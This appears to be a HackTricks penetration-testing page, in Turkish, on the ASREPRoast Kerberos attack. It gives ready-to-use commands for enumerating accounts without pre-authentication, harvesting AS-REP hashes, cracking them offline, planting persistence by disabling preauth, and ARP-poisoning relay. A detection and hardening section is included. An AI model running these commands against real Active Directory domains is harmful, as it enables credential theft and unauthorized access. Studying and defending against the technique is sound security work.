# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast, **Kerberos pre-authentication required attribute** özelliğinden yoksun kullanıcıları hedef alan bir security attack'tir. Temel olarak bu vulnerability, attackers'ın kullanıcının password'üne ihtiyaç duymadan Domain Controller'dan (DC) bir kullanıcı için authentication request göndermesine olanak tanır. DC daha sonra kullanıcının password'ünden türetilen key ile encrypt edilmiş bir message gönderir. Attackers, kullanıcının password'ünü keşfetmek için bu message'ı offline olarak crack etmeyi deneyebilir.

Bu attack için temel gereksinimler şunlardır:

- **Kerberos pre-authentication eksikliği**: Hedef kullanıcılar bu security feature'ı etkinleştirmemiş olmalıdır.
- **Domain Controller'a (DC) bağlantı**: Attackers'ın request göndermek ve encrypt edilmiş message'ları almak için DC'ye erişimi olmalıdır.
- **İsteğe bağlı domain account**: Bir domain account'a sahip olmak, attackers'ın LDAP queries aracılığıyla vulnerable kullanıcıları daha verimli şekilde belirlemesini sağlar. Böyle bir account olmadan attackers, username'leri tahmin etmek zorundadır.

#### Vulnerable kullanıcıları enumerate etme (domain credentials gerekir)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP mesajı isteği
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus varsayılan olarak **RC4** ister; bu nedenle Event ID **4768** genellikle **preauth type 0** ve **ticket encryption type 0x17** gösterir. **`/aes`** eklerseniz (veya hedef için RC4 devre dışı bırakılmışsa) bunun yerine **AES etypes** bekleyin.<sup>[[2]](#references)</sup>

#### Hızlı one-liner'lar (Linux)

- Önce olası hedefleri (ör. leak edilmiş build path'lerinden) Kerberos userenum ile enumerate edin: `kerbrute userenum users.txt -d domain --dc dc.domain`
- Geçerli creds olmadan NetExec kullanarak tüm username listesini roast edin: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- Creds'iniz varsa NetExec'in LDAP'ı query etmesine ve roast edilebilir tüm account'ları sizin için istemesine izin verin: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- Çıktı **`$krb5asrep$23$`** ile başlıyorsa Hashcat **`-m 18200`** ile crack edin. **`$krb5asrep$17$`** veya **`$krb5asrep$18$`** ile başlıyorsa John **`--format=krb5asrep`** kullanmayı tercih edin.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

Her AS-REP roast'ın RC4 olduğunu varsaymayın. Modern tooling, istenen/anlaşılan enctype'e bağlı olarak **RC4** (`$krb5asrep$23$`) veya **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`) döndürebilir. **`hashcat -m 18200`**, **etype 23** içindir; **John** ise **17/18/23** için `krb5asrep` formatını doğrudan işler.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Kalıcılık

**GenericAll** izinlerine (veya özellikleri yazma izinlerine) sahip olduğunuz bir kullanıcı için **preauth** gereksinimini devre dışı bırakın:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### Tespit ve hardening

Başarılı bir roast, DC üzerinde `Status=0x0` ve `PreAuthType=0` değerlerine sahip bir **4768** olayı üretir. Tespit için RC4 gerektirmeyin: `TicketEncryptionType=0x17` kullanışlı bir zayıf şifreleme sinyalidir, ancak saldırgan AES isteğinde bulunabilir (event-log değerleri `0x11`/`0x12`). 14 Ocak 2025 veya daha yeni cumulative update yüklü Windows Server 2016 ve sonraki sürümlerde, event 4768'in 2. sürümü ayrıca `ClientAdvertizedEncryptionTypes`, hesabın/DC'nin desteklediği etype'ları ve kullanılabilir anahtarları da gösterir.<sup>[[5]](#references)</sup>

Pratik bir hunt, hesap AES anahtarlarına sahipken yalnızca RC4 reklamı yapan bir istemciyi işaretler ve ardından tek bir kaynak IP'den birden fazla no-preauth kullanıcıya yönelik burst'leri ilişkilendirir. Her `PreAuthType=0` olayında alarm üretmek yerine, meşru istisnalar için baseline oluşturun.

Kalıcı çözüm, kesinlikle ihtiyaç duymayan her kullanıcıda **Do not require Kerberos preauthentication** seçeneğini kaldırmak ve açığa çıkan hesap parolalarını değiştirmektir. Bir istisna kaldırılamıyorsa, uzun ve rastgele oluşturulmuş bir parola ile minimum ayrıcalıklar kullanın. RC4'ü devre dışı bırakmak cracking maliyetini artırır, ancak AES AS-REP yanıtları offline-crack edilebilir olmaya devam ettiğinden roast edilebilirliğini ortadan kaldırmaz.<sup>[[2]](#references)[[5]](#references)</sup>

## Kimlik bilgileri olmadan ASREProast

On-path bir saldırgan, normal ve ön kimlik doğrulamalı bir AS exchange sırasında döndürülen AS-REP'yi yakalayabilir ve şifrelenmiş bölümünü offline cracking için biçimlendirebilir. Klasik ASREPRoasting'in aksine bu işlem `DONT_REQ_PREAUTH` gerektirmez; ancak yalnızca Kerberos exchange'i gerçekten yakalanan hesapları açığa çıkarır. **ASRepCatcher**, varsayılan olarak one-way ARP poisoning ile konumu elde eder veya `--disable-spoofing` ile başka bir MitM tekniğinden gelen trafiği kullanabilir.<sup>[[6]](#references)</sup>\
Bir no-preauth principal'dan **TGT** yerine **service ticket** döndüren ilgili kimlik bilgisi gerektirmeyen yöntemi istiyorsanız [Kerberoast](kerberoast.md) bölümüne bakın.

`relay` modunda [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher), yakalanan AS-REQ'leri iletir ve her iki taraf da hâlâ izin veriyorsa **RC4** kullanımını zorlar. `listen`, paketleri değiştirmez; bu nedenle istemci ile DC'nin negotiate ettiği enctype hangisiyse onu yakalar. Mümkün olduğunda tüm subnet'e dokunmak yerine poisoning kapsamını `-t`/`-tf` ile sınırlayın.<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – Event 4768: Bir Kerberos kimlik doğrulama bileti istendi](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
